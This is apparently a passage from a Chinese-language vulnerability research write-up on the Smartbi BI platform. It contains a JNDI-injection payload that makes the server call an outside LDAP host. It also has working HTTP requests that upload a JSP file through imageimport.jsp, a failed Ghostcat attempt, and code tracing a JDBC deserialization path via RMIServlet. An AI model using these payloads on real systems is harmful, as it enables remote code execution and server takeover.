class="hljs-string">&quot;COM.ibm.db2.jdbc.net.DB2Driver&quot;</span>;<br>            result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DB2_V9:<br>            result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>;<br>            <span class="hljs-keyword">if</span> (serverName.indexOf(<span class="hljs-string">&quot;:&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;:50000/&quot;</span> + dbName + <span class="hljs-string">&quot;:deferPrepares=false;&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName + <span class="hljs-string">&quot;:deferPrepares=false;&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>构造poc:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-attr">type</span><span class="hljs-operator">=</span>sqldictsync<span class="hljs-variable">&amp;</span>dbT<span class="hljs-attr">ype</span><span class="hljs-operator">=</span>DB2_V9<span class="hljs-variable">&amp;</span>dbS<span class="hljs-attr">erver</span><span class="hljs-operator">=</span>localhost:<span class="hljs-number">6688</span><span class="hljs-variable">&amp;</span>dbN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>a:a=a<span class="hljs-punctuation">;</span>clientRerouteServerListJNDIN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>ldap:<span class="hljs-comment">//169.254.39.1:1389/6bqlht;</span><br><br><span class="hljs-attr">type</span><span class="hljs-operator">=</span>sqldictsync<span class="hljs-variable">&amp;</span>dbT<span class="hljs-attr">ype</span><span class="hljs-operator">=</span>DB2_V9<span class="hljs-variable">&amp;</span>dbS<span class="hljs-attr">erver</span><span class="hljs-operator">=</span><span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span>:<span class="hljs-number">18080</span><span class="hljs-variable">&amp;</span>dbN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>a:a=a<span class="hljs-punctuation">;</span>clientRerouteServerListJNDIN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>ldap:<span class="hljs-comment">//169.254.39.1:1389/6bqlht;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659797.png" alt="20250802165747255"></p><h2 id="tomcat-历史漏洞（实则没有）"><a href="#tomcat-历史漏洞（实则没有）" class="headerlink" title="tomcat 历史漏洞（实则没有）"></a>tomcat 历史漏洞（实则没有）</h2><p>确定 tomcat 版本为 <code>Apache Tomcat Version 7.0.34</code></p><p>E:\Smartbi\Tomcat\RELEASE-NOTES</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700892.png" alt="20250731181914395"></p><h2 id="1、AJP-导致的-RCE"><a href="#1、AJP-导致的-RCE" class="headerlink" title="1、AJP 导致的 RCE"></a>1、AJP 导致的 RCE</h2><blockquote><p>CVE-2020-1938 ：Apache Tomcat AJP 漏洞复现和分析</p><p><a href="https://www.cnblogs.com/backlion/p/12870365.html">https://www.cnblogs.com/backlion/p/12870365.html</a></p><p>默认情况下,Apache Tomcat会开启AJP连接器,方便与其他Web服务器通过AJP协议进行交互.但Apache Tomcat在AJP协议的实现上存在漏洞,导致攻击者可以通过发送恶意的AJP请求,可以读取或者包含Web应用根目录下的任意文件,如果配合文件上传任意格式文件，将可能导致任意代码执行(RCE).该漏洞利用AJP服务端口实现攻击,未开启AJP服务对外不受漏洞影响（tomcat默认将AJP服务开启并绑定至0.0.0.0&#x2F;0）.</p></blockquote><p>确认 18009 端口开放，且能够建立 TCP 连接：</p><p><code>Test-NetConnection -ComputerName 127.0.0.1 -Port 18009</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700634.png" alt="20250731185501657"></p><p>使用 Ghostcat 漏洞检测工具：</p><p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><p>脚本成功建立了AJP协议连接返回了Tomcat 7.0.34的错误页面</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700131.png" alt="20250731191051181"></p><p>可能由于Smartbi对WEB-INF目录做了额外保护或者Tomcat配置了限制访问，并不能读取到文件</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>文件位置：Tomcat&#x2F;webapps&#x2F;smartbi&#x2F;vision&#x2F;designer&#x2F;imageimport.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span>%&gt;<br>&lt;%<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> request.getSession().getServletContext().getRealPath(<span class="hljs-string">&quot;&quot;</span>) + <span class="hljs-string">&quot;/vision/designer/images/&quot;</span>;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path);<br>    <span class="hljs-keyword">if</span> (!dir.exists()) &#123;<br>       dir.mkdirs();<br>    &#125;<br>    <span class="hljs-comment">//从请求头 X-File-Name 获取上传文件名</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(request.getHeader(<span class="hljs-string">&quot;X-File-Name&quot;</span>).getBytes(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    <span class="hljs-comment">//获取文件类型</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileType</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;X-File-Type&quot;</span>);<br>    <span class="hljs-comment">//判断是否包含 image 字符串 </span><br>    <span class="hljs-keyword">if</span>(fileType.indexOf(<span class="hljs-string">&quot;image&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>       response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>       response.resetBuffer();<br>       response.getOutputStream().write(<span class="hljs-string">&quot;error file type!&quot;</span>.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>       <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path + fileName);<br>    <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file);<br>    <span class="hljs-type">int</span> bytesRead;<br>    <span class="hljs-type">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>]; <span class="hljs-comment">// 4K buffer</span><br>    <span class="hljs-keyword">while</span> ((bytesRead = request.getInputStream().read(buf)) != -<span class="hljs-number">1</span>) &#123;<br>       fos.write(buf, <span class="hljs-number">0</span>, bytesRead);<br>    &#125;<br>    fos.flush();<br>    fos.close();<br>    smartbi.net.sf.json.<span class="hljs-type">JSONObject</span> <span class="hljs-variable">jobj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">smartbi</span>.net.sf.json.JSONObject();<br>    jobj.put(<span class="hljs-string">&quot;url&quot;</span>, path.substring(path.lastIndexOf(<span class="hljs-string">&quot;images/&quot;</span>)) + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>    <span class="hljs-comment">//jobj.put(&quot;dir&quot;, dir.getCanonicalPath());</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">resultStr</span> <span class="hljs-operator">=</span> jobj.toString();<br>    response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>    response.resetBuffer();<br>    response.getOutputStream().write(resultStr.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    e.printStackTrace();<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>对上传的文件名、MIME类型无判断、不严谨，可伪造伪造文件类型上传成功，造成漏洞</p><p><strong>漏洞复现：</strong></p><p>路由：<a href="http://localhost:18080/smartbi/vision/designer/imageimport.jsp">http://localhost:18080/smartbi/vision/designer/imageimport.jsp</a></p><p>需要配置页（<a href="http://localhost:18080/smartbi/vision/config.jsp%EF%BC%89%E7%9A%84%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%EF%BC%8C%E6%89%80%E4%BB%A5%E4%B8%8D%E8%83%BD%E5%92%8C%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%BB%93%E5%90%88%EF%BC%8C%E5%B1%9E%E4%BA%8E%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E">http://localhost:18080/smartbi/vision/config.jsp）的登录密码，所以不能和未授权访问结合，属于后台漏洞</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700365.png" alt="20250805160347015"></p><p>poc:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-comment">//GET 和 POST 都可以</span><br>GET <span class="hljs-regexp">/smartbi/</span>vision<span class="hljs-regexp">/designer/im</span>ageimport.jsp HTTP/<span class="hljs-number">1.1</span><br><br>X-<span class="hljs-keyword">File</span>-Type: image<br>X-<span class="hljs-keyword">File</span>-Name: <span class="hljs-number">1</span>.jsp<br><br>&lt;%=<span class="hljs-string">&quot;qwer&quot;</span>%&gt;<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/smartbi/vision/designer/imageimport.jsp</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:18080<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Basic YWRtaW46YWRtaW4=<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=EE2C934216E3D698C0C316CE1B30F7AF<br><span class="hljs-attribute">X-File-Type</span><span class="hljs-punctuation">: </span>image<br><span class="hljs-attribute">X-File-Name</span><span class="hljs-punctuation">: </span>1.jsp<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>11<br><br><span class="language-mel">&lt;%=<span class="hljs-string">&quot;qwer&quot;</span>%&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700613.png" alt="20250805161922205"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700732.png" alt="20250805162159129"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700420.png" alt="20250805162430488"></p><h2 id="JDBC反序列化"><a href="#JDBC反序列化" class="headerlink" title="JDBC反序列化"></a>JDBC反序列化</h2><blockquote><p>JDBC反序列化学习</p><p><a href="https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://xz.aliyun.com/news/7754">https://xz.aliyun.com/news/7754</a></p><p><a href="https://www.cnblogs.com/Litsasuk/articles/18410624">https://www.cnblogs.com/Litsasuk/articles/18410624</a></p><p><a href="https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html">https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html</a></p></blockquote><h3 id="关键条件："><a href="#关键条件：" class="headerlink" title="关键条件："></a>关键条件：</h3><ol><li><p>mysql-connector-java 的依赖版本为5.1.44，支持 <code>autoDeserialize=true</code> 参数，具备反序列化触发点</p></li><li><p>在 pom.xml 中 common-collections 版本为 3.2.1，存在cc反序列化利用链</p></li><li><p>存在方法调用反射机制 RMIServlet ，可远程调用任意类方法</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701680.png" alt="20250806085001007"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701410.png" alt="20250806125442264"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701846.png" alt="20250806125519870"></p><h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>触发点：DataSourceService -&gt; testConnection</p><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\client\datasource\DataSourceService.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testConnection</span><span class="hljs-params">(IDataSource dataSource)</span> &#123;<br>        MetaDataServiceImpl.getInstance().testConnection(dataSource);<br>    &#125;<br></code></pre></td></tr></table></figure><p>攻击者向<code>/vision/RMIServlet</code> 发送如下 POST 请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:18080<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-nim">className=<span class="hljs-type">DataSourceService</span>&amp;methodName=testConnection&amp;params=[<span class="hljs-meta">&#123;...&#125;</span>]</span><br></code></pre></td></tr></table></figure><p>通过类名和方法名反射调用，即：</p><p><code>className = DataSourceService</code> </p><p><code>methodName = testConnection</code> </p><p><code>params = [...]</code> 是 JSON 数组字符串，传进去后被包装成 <code>JSONArray</code> 类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">processExecute</span><span class="hljs-params">(HttpServletRequest request, String className, String methodName, String params)</span> &#123;<br>        <span class="hljs-comment">//RMIModule.getInstance() 返回一个远程服务模块（单例），它负责管理所有可远程调用的服务，getService(className) 根据类名获取对应的 ClientService 实例。</span><br>        <span class="hljs-type">ClientService</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> RMIModule.getInstance().getService(className);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">resultStr</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//结果字符串的构建器 buff 用于生成最终 JSON 格式的响应体</span><br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">buff</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>()).append(<span class="hljs-string">&#x27;&#123;&#x27;</span>);<br>            <span class="hljs-comment">//判断 service 是否存在，未找到就抛出异常</span><br>            <span class="hljs-keyword">if</span> (service == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (className != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-type">Locale</span> <span class="hljs-variable">locale</span> <span class="hljs-operator">=</span> CommonConfiguration.getInstance().getLocale();<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">notFoundClass</span> <span class="hljs-operator">=</span> StringUtil.replaceLanguage(<span class="hljs-string">&quot;$&#123;Notfoundclass&#125;&quot;</span>, locale);<br>                    <span class="hljs-keyword">throw</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartbiException</span>(CommonErrorCode.UNKOWN_ERROR)).setDetail(className + <span class="hljs-string">&quot; &quot;</span> + notFoundClass);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//记录调用时间</span><br>                <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()).getTime();<br>                <span class="hljs-comment">//执行 execute 方法，即反射调用</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> service.execute(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(params));<br>                <span class="hljs-type">long</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()).getTime() - startTime;<br>                <span class="hljs-keyword">if</span> (obj == <span class="hljs-literal">null</span>) &#123;<br>                    buff.append(<span class="hljs-string">&quot;\&quot;retCode\&quot;:0&quot;</span>);<br>                &#125;              <br></code></pre></td></tr></table></figure><p>接着 <code>params</code> 调用下面的方法： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> service.execute(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(params));<br></code></pre></td></tr></table></figure><p><code>execute</code>方法处理逻辑：将传入的 <code>JSON</code> 转为 <code>IDataSource</code> 对象,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClientService</span> &#123;<br>    ...<br>    <span class="hljs-comment">//接收 JSON 数组和方法名</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">execute</span><span class="hljs-params">(String var1, JSONArray var2)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//从 this.a 中取出方法名对应的 Method 对象</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> (Method)<span class="hljs-built_in">this</span>.a.get(var1);<br>            <span class="hljs-comment">//不存在抛出异常</span><br>            <span class="hljs-keyword">if</span> (var3 == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">throw</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartbiException</span>(CommonErrorCode.METHOD_NAME_ERROR)).setDetail(var1);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//检查参数个数</span><br>                Class[] var4 = var3.getParameterTypes();<br>                <span class="hljs-keyword">if</span> (var4.length != var2.length()) &#123;<br>                    <span class="hljs-keyword">throw</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartbiException</span>(CommonErrorCode.PARAM_COUNT_ERROR)).setDetail(StringUtil.getLanguageValue(<span class="hljs-string">&quot;Method2&quot;</span>) + <span class="hljs-string">&quot;\&quot;&quot;</span> + var1 + <span class="hljs-string">&quot;\&quot;&quot;</span> + StringUtil.getLanguageValue(<span class="hljs-string">&quot;Thenumberofparametersis&quot;</span>) + <span class="hljs-string">&quot; &quot;</span> + var4.length + <span class="hljs-string">&quot; ,&quot;</span> + StringUtil.getLanguageValue(<span class="hljs-string">&quot;Butthenumberofargumentspassedinis&quot;</span>) + <span class="hljs-string">&quot; &quot;</span> + var2.length() + <span class="hljs-string">&quot; .&quot;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">//创建Java类型参数数组</span><br>                    Object[] var5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[var2.length()];<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-comment">//进行类型转换，将 JSON -&gt; Java对象</span><br>                        <span class="hljs-comment">//获取每个参数的泛型类型（var6）</span><br>                        Type[] var6 = var3.getGenericParameterTypes();<br>                        <span class="hljs-comment">//遍历 JSON 参数，使用工具类 JSONUtil.jsonToObject(...) 转为目标类型</span><br>                        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var7 &lt; var5.length; ++var7) &#123;<br>                            <span class="hljs-comment">//var2 是 JSONArray，也就是传入的 params</span><br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> var2.get(var7);<br>                            <span class="hljs-comment">//目标方法 testConnection 的参数类型即 IDataSource</span><br>                            <span class="hljs-type">Class</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var4[var7];<br>                            <span class="hljs-comment">//泛型类型</span><br>                            <span class="hljs-type">Type</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> var6[var7];<br>                            <span class="hljs-comment">//把 JSON 中的 JSONObject 转换成一个 Java 对象（var9 指定的类型），并作为方法参数传入</span><br>                            var5[var7] = JSONUtil.jsonToObject(var8, var9, var10);<br>                        &#125;<br>                    &#125; <br><br></code></pre></td></tr></table></figure><p>再进入 <code>DataSourceService.testConnection()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testConnection</span><span class="hljs-params">(IDataSource dataSource)</span> &#123;<br>        MetaDataServiceImpl.getInstance().testConnection(dataSource);<br>    &#125;<br></code></pre></td></tr></table></figure><p>进入 <code>MetaDataServiceImpl.testConnection()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Java">conn = ConnectionPool.getInstance().getConnection(ds);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MetaDataServiceImpl</span> &#123;<br>    ...<br>    <span class="hljs-comment">//主要是将 IDataSource 转换为系统内部 DataSource 对象，然后尝试建立连接</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testConnection</span><span class="hljs-params">(IDataSource dataSource)</span> &#123;<br>    <span class="hljs-comment">//实例化 Smartbi 内部使用的 DataSource 类</span><br>    <span class="hljs-type">DataSource</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataSource</span>();<br>    <span class="hljs-comment">//UUIDGenerator.generate() 应是一个工具类，生成随机 UUID</span><br>    ds.setId(UUIDGenerator.generate());<br>    <span class="hljs-comment">//把外部传入的 IDataSource 转成系统内部 DataSource格式</span><br>    ds.setName(dataSource.getName());<br>    ds.setAlias(dataSource.getAlias());<br>    ds.setDriver(dataSource.getDriver());<br>    ds.setDesc(dataSource.getDesc());<br>    ds.setDbCharset(dataSource.getDbCharset());<br>    